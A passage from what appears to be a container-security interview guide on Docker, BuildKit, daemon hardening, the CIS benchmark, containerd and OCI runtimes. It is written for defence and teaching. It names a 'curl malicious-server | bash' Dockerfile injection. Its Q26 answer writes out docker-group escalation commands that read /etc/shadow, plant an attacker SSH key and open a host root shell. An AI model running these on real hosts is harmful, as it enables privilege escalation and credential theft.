   - Full host kernel access from CI runners
   - If CI job is compromised, host is compromised

2. **Mounted Docker socket:**
   - CI container with `/var/run/docker.sock` mounted
   - Can inspect/modify all other containers on the host
   - Can extract secrets from other containers' env vars

3. **Dockerfile injection:**
   - If Dockerfile content comes from untrusted source (PR from fork)
   - `RUN curl malicious-server | bash` in Dockerfile
   - Exfiltrates build secrets, registry credentials

4. **Cache poisoning:**
   - Build cache from untrusted registry layer
   - Malicious base image layer is cached and reused

5. **Secret leakage in image layers:**
   ```dockerfile
   # BAD - secret baked into layer
   RUN AWS_SECRET=xxx aws s3 cp s3://... .
   # Even if you delete it in the next layer, it's in the image history
   ```

**Mitigations:**

```bash
# Use Kaniko (no Docker daemon needed, runs unprivileged)
# Uses overlay filesystem in userspace
kaniko --context=git://github.com/org/repo --destination=registry/image:tag

# Use BuildKit with secret mounts (never baked into image)
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=aws_key AWS_SECRET_ACCESS_KEY=$(cat /run/secrets/aws_key) aws ...

# Use Buildah (rootless, daemonless)
buildah bud -t myimage .

# Ephemeral CI runners (no shared daemon)
# Each build gets fresh VM/pod

# Image signing post-build
cosign sign --key cosign.key registry/image@sha256:...
```

---

### Q23. How does BuildKit improve security over legacy Docker build?

**Tags:** `BuildKit` `build-secrets` `provenance` `SBOM`

**Answer:**

**BuildKit** is Docker's next-generation build engine, enabled by default since Docker 23.0.

**Security improvements over legacy builder:**

1. **Secret mounts (never in image layers):**
```dockerfile
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm install
```
Secret is available only during that `RUN` step, never written to filesystem layer.

2. **SSH agent forwarding (no key copying):**
```dockerfile
RUN --mount=type=ssh git clone git@github.com:private/repo.git
```
```bash
docker buildx build --ssh default=$SSH_AUTH_SOCK .
```

3. **Network isolation during build:**
```bash
docker buildx build --network=none .
# Disables network in RUN steps — forces all deps to be in build context
```

4. **Reproducible builds:** Content-addressable cache, consistent layer ordering.

5. **SBOM generation (BuildKit 0.11+):**
```bash
docker buildx build --attest type=sbom --output type=image,name=myimage .
# Attaches SPDX/CycloneDX SBOM as image attestation
```

6. **Provenance attestation:**
```bash
docker buildx build --provenance=true .
# SLSA provenance: what built it, from where, when
```

7. **Multi-platform builds in isolated environments:** No cross-contamination between `linux/amd64` and `linux/arm64` build steps.

---

### Q24. What are Docker daemon's security-relevant configuration options in `daemon.json`?

**Tags:** `daemon-hardening` `configuration` `CIS-benchmark`

**Answer:**

Complete security-hardened `daemon.json`:

```json
{
  "icc": false,
  "userns-remap": "default",
  "no-new-privileges": true,
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "100m",
    "max-file": "5"
  },
  "live-restore": true,
  "userland-proxy": false,
  "default-ulimits": {
    "nofile": { "Name": "nofile", "Hard": 64000, "Soft": 64000 }
  },
  "seccomp-profile": "/etc/docker/seccomp-custom.json",
  "storage-driver": "overlay2",
  "tls": true,
  "tlsverify": true,
  "tlscacert": "/certs/ca.pem",
  "tlscert": "/certs/cert.pem",
  "tlskey": "/certs/key.pem",
  "hosts": ["unix:///var/run/docker.sock"],
  "experimental": false,
  "metrics-addr": "127.0.0.1:9323",
  "max-concurrent-downloads": 3,
  "max-concurrent-uploads": 5,
  "default-address-pools": [
    { "base": "172.80.0.0/16", "size": 24 }
  ]
}
```

**Key options explained:**

| Option | Security Value |
|--------|---------------|
| `icc: false` | Disables inter-container communication by default (requires explicit `--link` or network) |
| `userns-remap` | UID mapping — container root ≠ host root |
| `no-new-privileges` | Prevents setuid escalation globally |
| `userland-proxy: false` | Uses `iptables` DNAT instead of `docker-proxy` process (reduces attack surface) |
| `experimental: false` | Disables untested features in production |

---

### Q25. Explain the CIS Docker Benchmark. What are the Level 1 vs Level 2 controls?

**Tags:** `CIS-benchmark` `compliance` `hardening` `audit`

**Answer:**

The **CIS Docker Benchmark** provides prescriptive hardening guidance for Docker CE/EE. It is organized into sections:

**Section 1: Host Configuration**
- 1.1: Use a separate partition for containers (`/var/lib/docker` on its own filesystem)
- 1.2: Harden the container host OS
- 1.3: Keep Docker up to date
- 1.4: Only allow trusted users in `docker` group

**Section 2: Docker Daemon Configuration**
- 2.1: Restrict network traffic between containers (`--icc=false`)
- 2.2: Set log level to at least `info`
- 2.3: Allow Docker to change iptables
- 2.8: Enable user namespace support
- 2.11: Use authorization plugins
- 2.14: Disable `--live-restore` if not needed (tradeoff)

**Section 3: Docker Daemon Configuration Files**
- 3.1–3.7: File permission checks on `daemon.json`, `docker.sock`, TLS certs

**Section 4: Container Images**
- 4.1: Create containers from trusted base images
- 4.2: Do not install unnecessary packages
- 4.5: Enable Content Trust
- 4.6: Add `HEALTHCHECK` instruction
- 4.9: Use `COPY` not `ADD`
- 4.10: Do not store secrets in Dockerfiles

**Section 5: Container Runtime**
- 5.1: Do not disable `AppArmor` profile
- 5.2: Do not use `--privileged`
- 5.4: Do not mount `/` as read-write
- 5.7: Do not map privileged ports
- 5.10: Do not use host network
- 5.15: Do not share host PID namespace
- 5.25: Restrict container from acquiring additional privileges

**Automated assessment:**
```bash
docker run --rm -it \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /etc:/etc:ro -v /usr/bin/docker:/usr/bin/docker:ro \
  docker/docker-bench-security
```

**Level 1:** Essential, low-impact hardening. Applicable to all environments.
**Level 2:** Deeper security requiring tradeoffs (functionality, usability). For high-security environments.

---

### Q26. What is the "docker group" privilege escalation, and how should access be managed?

**Tags:** `docker-group` `privilege-escalation` `sudoers` `access-control`

**Answer:**

The `docker` group is **effectively equivalent to root** on the host.

**Escalation via docker group:**
```bash
# User 'alice' is in docker group (but NOT root/sudo)
# Alice can escape to root:

# Method 1: Mount host filesystem
docker run -v /:/host --rm -it alpine chroot /host

# Method 2: Read shadow file
docker run -v /etc/shadow:/shadow:ro --rm alpine cat /shadow

# Method 3: Write SSH authorized_keys
docker run -v /root/.ssh:/root/.ssh alpine \
  sh -c 'echo "ssh-rsa ATTACKER_KEY" >> /root/.ssh/authorized_keys'

# Method 4: Gain root shell
docker run --rm -it --pid=host --cap-add SYS_PTRACE alpine nsenter -t 1 -m -u -i -n -p
```

**Why this is root:** The Docker daemon runs as root and executes all API commands with root privileges. `docker` group membership = unrestricted API access = root.

**Proper access management:**

1. **Never add developers to the `docker` group on production hosts**
2. **Use `sudo` with restricted commands:**
```
# /etc/sudoers.d/docker-restricted
alice ALL=(root) NOPASSWD: /usr/bin/docker ps, /usr/bin/docker logs *
```
3. **Use authorization plugins (OPA):** Policy-based API access control
4. **Rootless Docker:** Docker daemon runs as unprivileged user — group membership is safer
5. **Remote Docker contexts with mTLS:** Developers connect to isolated dev Docker instances

---

### Q27. How does Docker handle registry authentication, and what are the security risks?

**Tags:** `registry-auth` `credentials` `credential-helpers` `supply-chain`

**Answer:**

**Authentication mechanisms:**

1. **`~/.docker/config.json`** (legacy — insecure):
```json
{
  "auths": {
    "registry.example.com": {
      "auth": "dXNlcm5hbWU6cGFzc3dvcmQ="  // base64(user:pass) — NOT encrypted!
    }
  }
}
```
This is base64-encoded, not encrypted. Anyone reading this file has credentials.

2. **Credential helpers** (secure):
```json
{
  "credHelpers": {
    "gcr.io": "gcr",
    "*.dkr.ecr.*.amazonaws.com": "ecr-login",
    "ghcr.io": "github-actions"
  }
}
```
Credential helper executables (`docker-credential-ecr-login`, etc.) retrieve credentials at runtime from secure stores (OS keychain, EC2 instance metadata, GCP metadata server).

3. **`docker login` with token-based auth (OAuth2):**
For Docker Hub, GitHub Container Registry — short-lived tokens via OAuth.

**Security risks:**

| Risk | Description | Mitigation |
|------|-------------|------------|
| Credentials in `config.json` | Plaintext base64 | Use credential helpers |
| Credentials in CI env vars | `DOCKER_PASSWORD=xxx` in logs | Use OIDC/workload identity |
| Image pull with no verification | Pulling unsigned images | Enable DCT/Cosign |
| Credentials in image build | `ARG REGISTRY_PASS` | Use `--secret` mounts |
| Expired credentials caching | Stale creds accepted | Short TTL tokens, regular rotation |

**Production recommendation:**
- GKE: Workload Identity → Artifact Registry (no static credentials)
- EKS: IRSA (IAM Roles for Service Accounts) → ECR
- Self-hosted: Vault Agent with Docker credential helper

---

### Q28. What is Docker Swarm's security model compared to Kubernetes?

**Tags:** `Swarm` `Raft` `mTLS` `secrets-management`

**Answer:**

**Docker Swarm security model:**

1. **Mutual TLS by default:**
   - Every manager and worker has a TLS certificate issued by the Swarm CA
   - All inter-node communication is mTLS authenticated and encrypted
   - Certificates auto-rotate every 90 days (configurable)

2. **Raft consensus with encryption:**
   - Manager state (services, secrets) stored in Raft log
   - Raft log is encrypted with AES-256-GCM
   - Encryption key stored in `/var/lib/docker/swarm/certificates/` (protect this)

3. **Secrets management:**
   - Secrets stored encrypted in Raft log
   - Transmitted to worker nodes via encrypted mTLS channel
   - Mounted as `tmpfs` in container at `/run/secrets/<name>`
   - Never written to disk on worker (in-memory only)

4. **Node joining:** Worker must present join token (symmetric key) to join cluster

**Swarm vs. Kubernetes security comparison:**

| Feature | Swarm | Kubernetes |
|---------|-------|-----------|
| mTLS between nodes | ✅ Default | ✅ Default (kubeadm) |
| Secret encryption at rest | ✅ Raft encryption | ⚠️ Optional (etcd encryption config) |
| RBAC | ❌ Basic (manager/worker) | ✅ Granular RBAC |
| Network policy | ❌ No L7 policy | ✅ NetworkPolicy API |
| Pod Security | N/A | ✅ PSA/PSP |
| Audit logging | Basic | ✅ Comprehensive API audit |
| Supply chain | Basic (DCT) | ✅ OPA/Kyverno/Cosign |

**Recommendation:** Swarm is simpler with good defaults. Kubernetes has far superior security controls for production at scale.

---

### Q29. How do you audit Docker host filesystem interactions to detect container escapes?

**Tags:** `audit` `auditd` `escape-detection` `forensics`

**Answer:**

**Key indicators of container escape:**

1. **Unexpected writes outside container filesystem overlay**
2. **Namespace joins from container processes**
3. **Mount operations from container processes**
4. **`ptrace` of host processes**
5. **New processes in host PID namespace from container context**

**`auditd` rules for Docker:**

```bash
# /etc/audit/rules.d/docker.rules

# Monitor Docker daemon config changes
-w /etc/docker -p wa -k docker-config
-w /var/lib/docker -p wa -k docker-data

# Monitor namespace operations (container escape attempt)
-a always,exit -F arch=b64 -S unshare -k namespace-escape
-a always,exit -F arch=b64 -S setns -k namespace-join

# Monitor mount operations from non-root
-a always,exit -F arch=b64 -S mount -F auid!=0 -k container-mount

# Monitor ptrace
-a always,exit -F arch=b64 -S ptrace -k ptrace-attempt

# Monitor capability changes
-a always,exit -F arch=b64 -S capset -k capability-change

# Monitor socket creation (potential reverse shell)
-a always,exit -F arch=b64 -S socket -F a0=2 -k socket-create
```

**Runtime detection with Falco:**
```yaml
# Falco rule: Container escape via mount
- rule: Mount Namespace Escape
  desc: Container mounts host filesystem
  condition: >
    container and
    syscall.type = mount and
    not container.privileged
  output: >
    Container attempting mount (container=%container.name user=%user.name)
  priority: CRITICAL
```

**Post-escape forensics:**
```bash
# Check for unexpected namespace transitions
ls -la /proc/*/ns/  # Compare nsids of suspicious processes

# Check for unexpected mounts
cat /proc/mounts | grep overlay  # Unexpected overlayfs mounts

# Docker events
docker events --since 1h --format '{{json .}}' | grep -E "exec|mount"
```

---

### Q30. What is container image layer caching, and what security risks does it introduce?

**Tags:** `layer-cache` `cache-poisoning` `build-security` `reproducibility`

**Answer:**

**Layer caching mechanism:**
- Each Dockerfile instruction produces an image layer (a content-addressable overlay filesystem diff)
- Layer ID = SHA256(parent_layer_id + instruction_string + file_contents)
- BuildKit computes cache keys based on instruction content and input files
- Hit: reuse existing layer. Miss: rebuild from that instruction forward.

**Security risks:**

1. **Stale vulnerability in cached layer:**
   ```dockerfile
   FROM ubuntu:20.04          # Layer cached 6 months ago
   RUN apt-get update && apt-get install -y curl  # CACHED — vulnerable curl version!
   ```
   The `apt-get update` is cached — it doesn't re-fetch package lists. Use `--no-cache` in CI or `ARG CACHE_BUST=$(date +%Y-%m-%d)`.

2. **Cache poisoning via shared build cache:**
   - In shared CI environments (BuildKit remote cache), if an attacker can push to the cache, they can inject malicious layers
   - Mitigation: Authenticate cache registry, use separate cache per trust level

3. **Secrets in intermediate layers:**
   ```dockerfile
   COPY secrets.env .           # Layer 5: contains secret
   RUN process-secrets.sh       # Layer 6: uses secret
   RUN rm secrets.env           # Layer 7: secret deleted from filesystem
   # But layer 5 still contains the secret in the image!
   ```
   Extract: `docker save myimage | tar x --wildcards '*/layer.tar' | tar t`

4. **Layer content is not cryptographically tied to build inputs:**
   - Two identical `RUN` instructions may produce different layers if base image changed
   - Builds are not reproducible by default

**Secure caching practices:**
```bash
# Force fresh package cache in CI
docker buildx build --no-cache .

# Use BuildKit inline cache with registry auth
docker buildx build \
  --cache-from type=registry,ref=registry.example.com/cache \
  --cache-to type=registry,ref=registry.example.com/cache,mode=max \
  --push .

# Use build args to bust cache selectively
ARG BUILD_DATE
RUN apt-get update  # Busted by --build-arg BUILD_DATE=$(date)
```

---

## Section 3: containerd & OCI Runtime Security

---

### Q31. Explain the containerd architecture. What are its main components and security boundaries?

**Tags:** `containerd` `shim` `snapshotter` `OCI` `architecture`

**Answer:**

containerd is the industry-standard container runtime, used by Docker, Kubernetes (via CRI), and cloud providers (GKE, EKS, AKS).

**Architecture:**
```
kubelet / dockerd
     │ (gRPC/CRI)
     ▼
containerd (daemon)
  ├── Content Store (immutable blobs, CAS)
  ├── Snapshotter (overlay, btrfs, zfs, devmapper)
  ├── Image Service
  ├── Container Service
  ├── Task Service
  ├── Events Service
  └── Namespace Service
           │ (shim v2 protocol, ttrpc)
           ▼
  containerd-shim-runc-v2
           │ (OCI spec, pipes)
           ▼
        runc (creates container)
           │ (clone, unshare, execve)
           ▼
  Container Process (PID 1)
```

**Security boundaries:**

| Boundary | Trust Level | Protocol |
|---------|-------------|----------|
| kubelet → containerd | High (same host) | gRPC over Unix socket `/run/containerd/containerd.sock` |
| containerd → shim | High | ttrpc over Unix socket |
| shim → runc | High | OCI spec JSON, exec pipe |
| runc → container | Enforced by kernel | Namespaces, cgroups, capabilities |

**Key security properties:**
- **Content store is immutable:** Image layers are stored as content-addressable blobs (SHA256). Cannot be modified in place.
- **Snapshotter isolation:** Each container gets an isolated overlay snapshot. Writes go to the container's upper layer only.
- **Shim outlives containerd:** `containerd-shim` is the process that actually holds the container alive. Isolates container lifecycle from containerd restarts.
- **Namespaces (containerd-level):** containerd has its own namespace concept (not Linux namespaces) — used to isolate k8s from Docker resources within the same containerd instance.

---

### Q32. What is the OCI (Open Container Initiative) specification, and how does it define security?

**Tags:** `OCI` `runtime-spec` `image-spec` `distribution-spec`

**Answer:**

OCI has three specifications:

**1. OCI Runtime Specification** (what `runc`/`crun` implement):
Defines the `config.json` format for container runtime configuration:
```json
{
  "ociVersion": "1.0.2",
  "process": {
    "user": { "uid": 1000, "gid": 1000 },
    "capabilities": {
      "bounding": ["CAP_NET_BIND_SERVICE"],
      "effective": ["CAP_NET_BIND_SERVICE"],
      "permitted": ["CAP_NET_BIND_SERVICE"]
    },
    "noNewPrivileges": true,
    "oomScoreAdj": 100
  },
  "linux": {
    "namespaces": [
      { "type": "pid" }, { "type": "network" }, { "type": "mount" },
      { "type": "ipc" }, { "type": "uts" }, { "type": "user",
        "path": "" }
    ],
    "seccomp": { ... },
    "maskedPaths": ["/proc/kcore", "/proc/keys", "/sys/firmware"],
    "readonlyPaths": ["/proc/asound", "/proc/bus", "/proc/fs"]
  }
}
```

**2. OCI Image Specification:**
- Image = manifest + config + layers
- All content is content-addressed (SHA256)
- Manifest lists layer digests
- No cryptographic signature in core spec (Notary/Cosign add this)

**3. OCI Distribution Specification:**
- Defines registry API for push/pull
- Uses HTTPS, token-based auth (Bearer tokens via OAuth2)
- Content digests verified on pull

**Security gaps in OCI spec:**
- No mandatory signing in core spec
- No provenance or attestation in base spec (added by Sigstore ecosystem)
- No mandatory encryption (OCI image encryption is a separate extension)

---

### Q33. What is `runc` vs. `crun` vs. `gVisor (runsc)` vs. `kata-runtime`? When do you use each?

**Tags:** `OCI-runtime` `gVisor` `Kata` `runc` `security-tradeoffs`

**Answer:**

| Runtime | Language | Isolation | Use Case | Performance |
|---------|----------|-----------|----------|-------------|
| `runc` | Go | Linux namespaces + cgroups | Default, general purpose | Baseline (fast) |
| `crun` | C | Linux namespaces + cgroups | Lower latency, lower memory | ~2x faster startup than runc |
| `gVisor (runsc)` | Go | Userspace kernel (Sentry) | Untrusted code, SaaS | ~20-40% overhead |
| `kata-runtime` | Go | Hardware VM (QEMU/Firecracker) | High security, near-VM isolation | VM startup overhead |
| `youki` | Rust | Linux namespaces + cgroups | Experimental, memory-safe | Similar to crun |
| `nabla` | Unikernel | Library OS | Ultra-minimal syscall surface | Limited compatibility |

**gVisor security model:**
```
Container process
     │ syscall
     ▼
  Sentry (gVisor userspace kernel in Go)
     │ limited host syscalls (~70 vs ~400+)
     ▼
  Host kernel
```
- Sentry intercepts all container syscalls
- Implements Linux kernel semantics in Go (memory-safe)
- Only ~70 host syscalls needed (vs 400+ without gVisor)
- Attack path: compromise Sentry (written in safe Go) → very small host syscall surface

**Kata security model:**
```
Container process
     │ syscall
     ▼
  Guest kernel (per-container)
     │ hypercall
     ▼
  Hypervisor (QEMU/Firecracker)
     │
  Host kernel
```

**Decision matrix:**
- Internal services with trusted code: `runc` or `crun`
- Untrusted user code (FaaS, sandbox): `gVisor`
- Regulated workloads / PCI-DSS / multi-tenant: `Kata`
- Maximum startup speed: `crun`

**Configure in containerd:**
```toml
# /etc/containerd/config.toml
[plugins."io.containerd.grpc.v1.cri".containerd.runtimes.gvisor]
  runtime_type = "io.containerd.runsc.v1"

[plugins."io.containerd.grpc.v1.cri".containerd.runtimes.kata]
  runtime_type = "io.containerd.kata.v2"
```

---

### Q34. Explain containerd's snapshotter architecture and its security implications.

**Tags:** `snapshotter` `overlay` `filesystem-isolation` `CVE`

**Answer:**

The **snapshotter** is containerd's layer management subsystem. It manages the union filesystem (overlay) that forms the container's view of the filesystem.

**Overlay filesystem layers:**
```
Lower layers (read-only, shared):  ubuntu base → app deps → app code
Upper layer (read-write, per-container): container writes
Work directory: overlay bookkeeping
Merged view: what container sees
```

**Available snapshotters:**

| Snapshotter | Kernel Feature | Use Case |
|-------------|---------------|----------|
| `overlayfs` | overlayfs (3.18+) | Default, best performance |
| `native` | Simple copy | Fallback, no kernel support needed |
| `btrfs` | btrfs snapshots | On btrfs filesystems |
| `zfs` | ZFS snapshots | On ZFS filesystems |
| `devmapper` | Device mapper | Legacy, thin provisioning |
| `stargz` | Lazy pulling | Startup latency reduction |

**Security considerations:**

1. **Overlay path exposure:** The overlay `upperdir` path is accessible on the host. Files written inside containers are visible at host path `/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/`. Root on host can read any container's filesystem.

2. **CVE-2021-41091 (Moby):** Incorrect permissions on overlay mount points allowed unprivileged users to read container filesystem contents. Fixed by restricting access to snapshot directories.

3. **Hard link attacks:** In some configurations, container processes could create hard links to files outside their mount namespace via race conditions.

4. **Stargz security:** Lazy-pulling fetches image layers on demand. Network availability required during container execution. Cache integrity must be verified.

5. **User namespace + overlay:** Combining user namespaces with overlayfs requires kernel support for `metacopy` and `redirect_dir` options. Misconfiguration can cause privilege escalation.

---

### Q35. What is containerd's CRI (Container Runtime Interface) and how does it affect Kubernetes security?

**Tags:** `CRI` `kubelet` `containerd` `kubernetes-integration`

**Answer:**

**CRI** is a Kubernetes-defined gRPC API that kubelet uses to manage containers, images, and sandboxes. containerd implements CRI via its CRI plugin.

**Architecture:**
```
kubelet
  │ CRI gRPC (/run/containerd/containerd.sock)
  ▼
containerd CRI plugin
  ├── RunPodSandbox → creates pause container + network namespace
  ├── CreateContainer → creates app container in sandbox
  ├── StartContainer
  ├── ExecSync → executes commands (kubectl exec)
  ├── PullImage → pulls from registry
  └── RemoveContainer
```

**Security implications of CRI:**

1. **Socket access = node compromise:** The containerd socket (`/run/containerd/containerd.sock`) has equivalent privilege to the Docker socket. Pods that can access this socket (via hostPath volume) can escape to the node.

2. **`kubectl exec` security:**
   - `ExecSync` creates a new process in the container's namespaces
   - Intercepted by containerd → shim → runc's `exec` feature
   - Bypasses any network-level restrictions (goes via API server → kubelet → containerd)
   - Audit: enable API server audit policy for `exec` events

3. **Image pull secrets:**
   - CRI receives image pull credentials via `ImageSpec.auth` field
   - containerd stores these transiently in memory
   - Never persisted to disk (unlike `~/.docker/config.json`)

4. **containerd config security:**
```toml
# /etc/containerd/config.toml
version = 2

[plugins."io.containerd.grpc.v1.cri"]
  enable_selinux = true
  enable_unprivileged_ports = false
  enable_unprivileged_icmp = false

[plugins."io.containerd.grpc.v1.cri".containerd]
  default_runtime_name = "runc"
  discard_unpacked_layers = false

[plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc]
  runtime_type = "io.containerd.runc.v2"
  
[plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]
  SystemdCgroup = true
  NoNewKeyring = true
```

---

### Q36. What is the `containerd-shim`, and why is it architecturally significant for security?

**Tags:** `containerd-shim` `ttrpc` `orphaned-process` `lifecycle`

**Answer:**

`containerd-shim-runc-v2` is a small process (one per container or pod) that acts as the intermediary between containerd and the container process.

**Why shim exists:**
- Allows containerd to restart without killing containers (daemon lifecycle independence)
- Provides `stdin/stdout/stderr` I/O bridging
- Holds `runc` state after container creation
- Reports container exit status to containerd

**Security properties of shim:**

1. **Minimal privilege:** Shim runs with the privileges needed to manage one container — not all containers. Compromise of shim = compromise of one container, not the runtime.

2. **ttrpc communication:** Shim communicates with containerd over ttrpc (tiny gRPC, lower overhead). Socket is created in a per-container directory with restricted permissions.

3. **Process tree:** Container PID 1 is a child of `containerd-shim`, not `containerd` or `dockerd`. This means:
   - Shim is the container's reaper (collects zombie processes)
   - Container cannot signal containerd directly

4. **Shim compromise impact:** If shim is compromised (unlikely, minimal code), attacker can:
   - Intercept container I/O
   - Send signals to container PID 1
   - But cannot access other containers or modify containerd state

5. **Orphaned shims:** If containerd crashes and `live-restore` is not configured, shims become orphaned. The containers continue running (shim keeps them alive) but containerd has no record of them.

```bash
# View shim processes
ps aux | grep containerd-shim

# Shim socket location
ls /run/containerd/s/  # ttrpc sockets

# Container's parent processes
pstree -p $(docker inspect <id> -f '{{.State.Pid}}')
```

---

### Q37. How does containerd handle image verification and what integrations exist?

**Tags:** `image-verification` `cosign` `policy` `admission`

**Answer:**

containerd's native image verification capabilities are limited but extensible:

**Built-in:** Content-addressable digest verification — when pulling `image@sha256:abc123`, containerd verifies the fetched content matches that digest. Prevents MITM layer substitution.

**Policy-based verification via containerd plugins:**

1. **`containerd-imgcrypt`:** Image encryption/decryption using JWE (JSON Web Encryption). Ensures only nodes with the decryption key can run specific images.

2. **`cosign` + `policy-controller` (Sigstore):**
```yaml
# ClusterImagePolicy (Sigstore policy-controller)
apiVersion: policy.sigstore.dev/v1beta1
kind: ClusterImagePolicy
metadata:
  name: require-signed-images
spec:
  images:
    - glob: "registry.example.com/**"
  authorities:
    - keyless:
        url: https://fulcio.sigstore.dev
        identities:
          - issuer: https://accounts.google.com
            subjectRegExp: ".*@example.com"
```

3. **Notary v2 (nv2) / `notation`:** Next-gen Notary with OCI artifact support.
```bash
# Sign
notation sign registry.example.com/myimage:v1.0 --key mykey

# Verify
notation verify registry.example.com/myimage:v1.0
```

4. **OPA/Gatekeeper:** Admission webhook that can verify image signatures before allowing pod creation.

5. **Connaisseur:** Kubernetes admission controller that validates Notary/Cosign signatures.

**containerd snapshot integrity:** After pull, containerd stores blobs in the content store (CAS). Any subsequent access reads from CAS — on-disk corruption is detected at read time (SHA256 mismatch).

---

### Q38. What are the security differences between `docker exec` and spawning a new container?

**Tags:** `exec` `process-injection` `isolation` `audit`

**Answer:**

**`docker exec`** creates a new process inside an existing container's namespaces via `runc exec`:

```bash
docker exec -it mycontainer /bin/sh
# Equivalent to:
runc exec mycontainer /bin/sh
# Which does:
# setns() into container's pid/net/mnt/ipc namespaces
# Apply cgroup membership
# Apply capabilities (of the container, not the exec'd process specifically)
# execve /bin/sh
```

**Security differences:**

| Aspect | `docker exec` | New Container |
|--------|--------------|---------------|
| PID namespace | Joins existing (sees all container processes) | Fresh namespace |
| Network | Shares container's interfaces | Fresh or shared |
| Filesystem | Shares container's overlay | Fresh overlay |
| Seccomp | Container's profile | Container's profile |
| Capabilities | Container's capabilities | Container's capabilities |
| AppArmor | Container's profile | Container's profile |
| Root filesystem writes | Persistent in container's upper layer | Persistent in container's upper layer |
| Audit trail | `docker exec` event emitted | `docker create`/`start` event |

**Security concerns with `docker exec`:**

1. **Process injection:** `exec` with `--user root` into a non-root container = root process in container namespace
2. **Audit bypass:** `exec`'d processes may not be captured by per-process audit rules (they appear as children of container PID 1)
3. **Signal interference:** `exec`'d processes can signal other container processes
4. **No new seccomp:** `exec` uses the container's existing seccomp profile, not a potentially tighter one

**Kubernetes equivalent:** `kubectl exec` → goes through API server audit → kubelet → CRI exec.

**Best practice:** Disable `docker exec` (or `kubectl exec`) in production via authorization policies except for break-glass scenarios. Use ephemeral debug containers instead.

---

### Q39. Explain OCI image encryption (`imgcrypt`) and its threat model.

**Tags:** `image-encryption` `imgcrypt` `JWE` `confidential-computing`

**Answer:**

**OCI image encryption** (`containerd-imgcrypt`) allows encrypting image layer blobs so only authorized nodes can decrypt and run them.

**Threat model protection:**
- Prevents registry operator from reading image contents
- Prevents unauthorized nodes from running sensitive images
- Protects IP in image layers (proprietary ML models, licensed software)

**Does NOT protect:**
- Runtime memory (running container's memory is plaintext)
- Container filesystem (decrypted at pull time, stored in containerd content store)
- Network traffic from container (use TLS in app)

**Encryption mechanism:**
1. Layer blobs encrypted with symmetric key (AES-256-GCM)
2. Symmetric key wrapped with recipient's public key (RSA, EC, or OCI-Keys)
3. Encrypted key stored in image manifest's `annotations`
4. On pull, containerd uses node's private key to unwrap layer key, then decrypts layers

```bash
# Encrypt image (using ocicrypt tools)
skopeo copy \
  --encryption-key jwe:pubkey.pem \
  docker://nginx:latest \
  docker://registry.example.com/nginx-encrypted:latest

# Pull on authorized node (with private key)
# containerd automatically decrypts using configured key provider
```

**Key management for nodes:**
- Keys stored in node's TPM (Trusted Platform Module) — most secure
- Keys stored in Vault with node authentication
- Keys managed via OPA/attestation policy

**Limitations:**
- Adds latency to image pull (decryption overhead)
- Key management complexity
- Not yet widely adopted in production

---

### Q40. What is the `pause` container in Kubernetes, and what are its security properties?

**Tags:** `pause` `infra-container` `network-namespace` `pod-security`

**Answer:**

The **pause container** (also called the "infra container") is a minimal container that:
- Creates and holds the pod's network namespace
- Creates and holds the pod's IPC namespace (if shared)
- Holds the pod's PID namespace (if PID sharing is enabled)
- Runs a minimal `pause` binary that just sleeps (waits for signals)

**Why it exists:**
Pod containers need to share a network namespace (same IP, same ports). Rather than having one container "own" the namespace (and die = network disappears), a separate `pause` container holds it. App containers join the existing namespace.

**Security properties:**

1. **Minimal image:** `registry.k8s.io/pause:3.9` is ~700KB. Runs as `nobody` (UID 65535). Contains no shell, no package manager.

2. **Network namespace boundary:** All containers in a pod share the pause container's network namespace. This means:
   - Any container in the pod can bind to any port
   - Any container can connect to localhost services of other containers
   - **Trust all containers in a pod equally on the network level**

3. **IPC namespace:** By default, pod containers share IPC namespace (SysV IPC, POSIX message queues). A compromised container can send signals or IPC messages to other containers in the same pod.

4. **PID namespace sharing (optional):** When `shareProcessNamespace: true`:
   - All containers see each other's processes
   - Can ptrace each other (if capabilities allow)
   - Useful for debugging, dangerous for untrusted sidecars

```yaml
spec:
  shareProcessNamespace: false  # Default - do not enable unless necessary
  containers:
  - name: app
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      allowPrivilegeEscalation: false
```

---

## Section 4: Image & Supply Chain Security

---

### Q41. What is the Docker image attack surface, and how do you systematically analyze an image for vulnerabilities?

**Tags:** `image-scanning` `CVE` `attack-surface` `SBOM`

**Answer:**

**Image attack surface layers:**

1. **Base OS packages** — the largest attack surface. Alpine has ~10 packages; Ubuntu has ~200+.
2. **Application runtime** (Node.js, JVM, Python interpreter) — frequent CVEs in runtimes
3. **Application dependencies** (npm, pip, Maven packages)
4. **Application code itself** — logic vulnerabilities, hardcoded secrets
5. **Configuration files** — exposed configs, world-readable secrets
6. **Binary layers** — statically linked binaries, vendored code

**Systematic analysis:**

```bash
# Step 1: Generate SBOM
syft myimage:latest -o spdx-json > sbom.spdx.json

# Step 2: Scan SBOM for CVEs
grype sbom:./sbom.spdx.json --fail-on high

# Step 3: Scan with multiple scanners (reduce false negatives)
trivy image myimage:latest --format json --output trivy.json
snyk container test myimage:latest
docker scout cves myimage:latest

# Step 4: Check for secrets in image
trufflehog docker --image myimage:latest
detect-secrets scan < <(docker save myimage | tar xO --wildcards '*/layer.tar' | tar t)

# Step 5: Inspect image metadata
docker inspect myimage | jq '.[].Config.Env'  # Env vars
docker history myimage  # Layer commands
dive myimage  # Interactive layer explorer

# Step 6: Check for setuid binaries
docker run --rm myimage find / -perm /4000 -type f 2>/dev/null

# Step 7: Verify no shell in final image
docker run --rm myimage which sh bash ash  # Should fail
```

**Vulnerability prioritization matrix:**

| Factor | Weight |
|--------|--------|
| CVSS Score ≥ 9.0 | Critical |
| Reachable from network | High amplifier |
| Exploitable without auth | High amplifier |
| In base image (affects all images) | High scope |
| Fixable (fix available) | Actionable |

---

### Q42. What is Sigstore/Cosign and how does it provide keyless container signing?

**Tags:** `Sigstore` `Cosign` `keyless-signing` `OIDC` `supply-chain`

**Answer:**

**Sigstore** is an open-source supply chain security project (CNCF). It provides:
- **Cosign:** Container image signing and verification tool
- **Fulcio:** Certificate authority for code signing (issues short-lived certs)
- **Rekor:** Immutable transparency log for signatures (like Certificate Transparency for code signing)

**Keyless signing flow:**
```
